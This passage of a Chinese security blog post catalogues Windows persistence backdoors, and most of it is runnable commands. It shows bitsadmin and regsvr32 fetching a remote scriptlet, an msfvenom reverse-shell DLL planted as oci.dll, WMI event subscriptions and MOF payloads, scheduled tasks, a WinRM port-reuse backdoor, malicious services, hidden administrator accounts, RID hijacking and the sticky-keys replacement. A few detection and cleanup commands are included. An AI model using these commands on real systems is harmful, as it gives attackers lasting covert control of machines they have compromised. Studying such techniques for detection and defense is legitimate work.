+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionpolicy bypass .\test.ps1</span><br><span class="line"></span><br><span class="line">waitfor /s 127.0.0.1 /si persist</span><br></pre></td></tr></table></figure>
+<p>即可看到效果。</p>
+<p><img src="../images/Persistence/14.png" alt="14.png"></p>
+<h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><p>win7之后，进行上传下载的工具。</p>
+<p>利用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; bitsadmin /create backdoor</span><br><span class="line">PS C:\Users\Administrator&gt; bitsadmin /addfile backdoor c:\windows\system32\calc.exe c:\Users\administrator\Desktop\calc.</span><br><span class="line">exe</span><br><span class="line">PS C:\Users\Administrator&gt; bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:http://192.168.31.109/calc.sc</span><br><span class="line">t scrobj.dll&quot;</span><br><span class="line">PS C:\Users\Administrator&gt; bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/15.png" alt="15.png"></p>
+<p>当然，换成msf的sct也就可以上线了。白名单运行程序不仅仅只有regsvr32，还有别的很多，可以去查下资料</p>
+<p>可以使用下面的方法进行检测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; bitsadmin /list /verbose</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/16.png" alt="16.png"></p>
+<h3 id="msdtc加载后门"><a href="#msdtc加载后门" class="headerlink" title="msdtc加载后门"></a>msdtc加载后门</h3><p>msdtc.exe 存在于组环境和域环境中,是微软的一个分布式事物处理协调器服务。要求处于工作组或者域环境内。</p>
+<p><img src="../images/Persistence/17.png" alt="17.png"></p>
+<p>因为他在启动时会默认加载oci.dll，SQLLib80.dll和xa80.dll。Windows系统默认不包含oci.dll。</p>
+<p>我们将后门dll将其重命名为oci.dll，并将其放置在%SystemRoot%\system32\中，那么重启时，就会加载我们的dll，然后得到一个session。</p>
+<p>注意，dll版本要根据目标机器的位数来生成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.109 LPORT=4444 -f dll &gt; oci.dll</span><br><span class="line"></span><br><span class="line">cmd或powershell下执行</span><br><span class="line">taskkill /f /im msdtc.exe</span><br><span class="line">net start msdtc</span><br></pre></td></tr></table></figure>
+<p>即可获得会话。</p>
+<p><img src="../images/Persistence/18.png" alt="18.png"></p>
+<h3 id="wmi执行后门技术"><a href="#wmi执行后门技术" class="headerlink" title="wmi执行后门技术"></a>wmi执行后门技术</h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p>
+<p>在使用wmi进行权限维持的时候，我们一般用到下面的三个类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__EventFilter </span><br><span class="line">EventConsumer</span><br><span class="line">__FilterToConsumerBinding</span><br></pre></td></tr></table></figure>
+<p>下面我们看下他的利用方式，首先是mof。</p>
+<p>msf先生成一个web的监听，然后使用msf生成文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">irb</span><br><span class="line">puts generate_mof(&quot;Metasploit1&quot;,&quot;regsvr32 /s /n /u /i:http://192.168.31.109:8080/RjdtuMLURHfkH.sct scrobj.dll&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/19.png" alt="19.png"></p>
+<p>然后编译mof</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp.exe .\Metasploit.mof</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/20.png" alt="20.png"></p>
+<p>即可得到会话。第二种方式就是使用wmi事件。</p>
+<p>命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;PentestLab&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;PentestLab&quot;, ExecutablePath=&quot;C:\users\administrator\desktop\msf.exe&quot;,CommandLineTemplate=&quot;C:\users\administrator\desktop\msf.exe&quot;</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;PentestLab\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;PentestLab\&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>然后重启电脑，60s后反弹会话。</p>
+<p><img src="../images/Persistence/21.png" alt="21.png"></p>
+<p>powershell版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$FilterArgs = @&#123;name=&apos;Pentestlab-WMI&apos;;</span><br><span class="line">                EventNameSpace=&apos;root\CimV2&apos;;</span><br><span class="line">                QueryLanguage=&quot;WQL&quot;;</span><br><span class="line">                Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;&#125;;</span><br><span class="line">$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs</span><br><span class="line"> </span><br><span class="line">$ConsumerArgs = @&#123;name=&apos;Pentestlab-WMI&apos;;</span><br><span class="line">                CommandLineTemplate=&quot;$($Env:SystemRoot)\System32\pentestlab.exe&quot;;&#125;</span><br><span class="line">$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs</span><br><span class="line"> </span><br><span class="line">$FilterToConsumerArgs = @&#123;</span><br><span class="line">Filter = [Ref] $Filter;</span><br><span class="line">Consumer = [Ref] $Consumer;</span><br><span class="line">&#125;</span><br><span class="line">$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs</span><br></pre></td></tr></table></figure>
+<p>如果想要删除的话，可以使用下面的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter &quot;Name = &apos;Pentestlab-WMI&apos;&quot;</span><br><span class="line">$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter &quot;Name = &apos;Pentestlab-WMI&apos;&quot;</span><br><span class="line">$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query &quot;REFERENCES OF &#123;$($EventConsumerToCleanup.__RELPATH)&#125; WHERE ResultClass = __FilterToConsumerBinding&quot;</span><br><span class="line"> </span><br><span class="line">$FilterConsumerBindingToCleanup | Remove-WmiObject</span><br><span class="line">$EventConsumerToCleanup | Remove-WmiObject</span><br><span class="line">$EventFilterToCleanup | Remove-WmiObject</span><br></pre></td></tr></table></figure>
+<p>powershell版本的也可以直接使用别人写好的脚本：<a href="https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1" target="_blank" rel="noopener">https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1</a></p>
+<p>当然以下工具都具有该功能：Empire、SharpSploit、PoshC2、PowerLurk、WMIPersist、</p>
+<p>而对于此类攻击的检测，就查看上面所说的那三种类就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#List Event Filters</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line"></span><br><span class="line">#List Event Consumers</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line">#List Event Bindings</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/22.png" alt="22.png"></p>
+<p>且能发现木马的踪迹</p>
+<p><img src="../images/Persistence/23.png" alt="23.png"></p>
+<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><p>经典中的经典。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe /Create /TN update /TR xx(你要执行的命令)  /SC ONLOGON /F /RL HIGHEST</span><br></pre></td></tr></table></figure>
+<p>demo：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;schtasks /create /sc minute /mo 1 /tn &quot;chrome&quot; /tr &quot;wscri</span><br><span class="line">pt.exe C:\users\Administrator\Desktop\msf.vbs&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/24.png" alt="24.png"></p>
+<p>或者使用powershell无文件加载也是可以的。</p>
+<h3 id="WinRM服务后门"><a href="#WinRM服务后门" class="headerlink" title="WinRM服务后门"></a>WinRM服务后门</h3><p>基本原理是使用Windows 的远程管理管理服务WinRM，组合HTTP.sys驱动自带的端口复用功能，一起实现正向的端口复用后门。后门连接是需要目标服务器的高权用户的明文密码的，需要先抓取相应的明文密码才可部署后门。</p>
+<p>下面是部署方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125; //开启监听</span><br><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;　//更改wimrm的端口，防止被怀疑</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/25.png" alt="25.png"></p>
+<p>查看状态：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm e winrm/config/listener</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/26.png" alt="26.png"></p>
+<p>然后链接后门，本地做如下设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后连接后门，获得cmd环境。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs -r:http://192.168.31.94 -u:administrator -p:abc123! cmd</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/27.png" alt="27.png"></p>
+<p>如果是非管理员用户，用下面的方法修改注册表即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+<h3 id="修改系统服务"><a href="#修改系统服务" class="headerlink" title="修改系统服务"></a>修改系统服务</h3><p>使用sc制作权限维持：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#创建Fax传真服务，并设置为自启动</span><br><span class="line">sc create Fax binPath= &quot;C:\123123.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span><br><span class="line">#增加服务描述</span><br><span class="line">sc descrīption Fax</span><br><span class="line">#启动</span><br><span class="line">sc start Fax</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/28.png" alt="28.png"></p>
+<p>重启获得会话。</p>
+<p><img src="../images/Persistence/29.png" alt="29.png"></p>
+<p>记得监听添加下面的参数防止假死：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set autorunscript migrate -f</span><br></pre></td></tr></table></figure>
+<h3 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h3><p>这个，看个人的思路以及编码能力了，比如劫持个安全狗？？</p>
+<p><img src="../images/Persistence/30.png" alt="30.png"></p>
+<h2 id="远程登录类"><a href="#远程登录类" class="headerlink" title="远程登录类"></a>远程登录类</h2><h3 id="影子账户、克隆账户、激活guest"><a href="#影子账户、克隆账户、激活guest" class="headerlink" title="影子账户、克隆账户、激活guest"></a>影子账户、克隆账户、激活guest</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test$ 123456 /add&amp;&amp;net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/31.png" alt="31.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes</span><br><span class="line">net user guest 1234</span><br><span class="line">net localgroup administrators guest /add</span><br></pre></td></tr></table></figure>
+<h3 id="rid-hijack"><a href="#rid-hijack" class="headerlink" title="rid_hijack"></a>rid_hijack</h3><p>通过劫持有效帐户的RID来在注册表中进行修改，以使Guest帐户成为管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(windows/manage/rid_hijack) &gt; set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf5 post(windows/manage/rid_hijack) &gt; set getsystem true </span><br><span class="line">getsystem =&gt; true</span><br><span class="line">msf5 post(windows/manage/rid_hijack) &gt; set guest_account true </span><br><span class="line">guest_account =&gt; true</span><br><span class="line">msf5 post(windows/manage/rid_hijack) &gt; set password 123!@ASQs</span><br><span class="line">password =&gt; 123!@ASQs</span><br><span class="line">msf5 post(windows/manage/rid_hijack) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/32.png" alt="32.png"></p>
+<p>然后impacket链接</p>
+<p><img src="../images/Persistence/33.png" alt="33.png"></p>
+<h3 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\sethc.exe     粘滞键，启动快捷键：按五次shift键</span><br><span class="line">C:\Windows\System32\utilman.exe   设置中心，启动快捷键：Windows+U键</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+<p>高版本的话就映像劫持吧。</p>
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/qq_23936389/article/details/101730500" target="_blank" rel="noopener">https://blog.csdn.net/qq_23936389/article/details/101730500</a><br><a href="https://www.cnblogs.com/-mo-/p/12449964.html" target="_blank" rel="noopener">https://www.cnblogs.com/-mo-/p/12449964.html</a><br><a href="https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" target="_blank" rel="noopener">https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a><br><a href="http://www.easy233.top/?p=268" target="_blank" rel="noopener">http://www.easy233.top/?p=268</a><br><a href="https://www.c0bra.xyz/2019/11/29/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-BITS/" target="_blank" rel="noopener">https://www.c0bra.xyz/2019/11/29/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-BITS/</a><br><a href="https://www.bugfor.com/vuls/4906.html" target="_blank" rel="noopener">https://www.bugfor.com/vuls/4906.html</a><br><a href="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md</a><br><a href="https://github.com/netbiosX/Checklists/blob/master/Persistence.md" target="_blank" rel="noopener">https://github.com/netbiosX/Checklists/blob/master/Persistence.md</a><br><a href="https://pentestlab.blog/2020/05/20/persistence-com-hijacking/" target="_blank" rel="noopener">https://pentestlab.blog/2020/05/20/persistence-com-hijacking/</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/Persistence/">windows单机Persistence</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年05月24日 - 16:05</p>
+  <p><span>最后更新:</span>2020年05月24日 - 16:05</p>
+  <p><span>原始链接:</span><a href="/Persistence/" title="windows单机Persistence">https://lengjibo.github.io/Persistence/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/Persistence/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Persistence/" rel="tag"><i class="fa fa-tag"></i> Persistence</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/DLLinjection/" rel="next" title="DLL injection">
+                <i class="fa fa-chevron-left"></i> DLL injection
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">104</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">116</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
